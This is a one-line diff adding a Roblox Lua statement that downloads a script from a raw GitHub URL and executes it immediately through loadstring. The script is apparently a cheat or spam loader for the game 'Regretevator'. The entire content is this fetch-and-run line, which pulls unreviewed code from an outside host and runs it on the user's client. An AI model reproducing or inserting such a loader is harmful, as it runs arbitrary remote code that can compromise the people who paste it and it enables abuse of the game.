@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/regretevator-elevator-simulator-spam6-de9q17ljoei61d.lua"))()
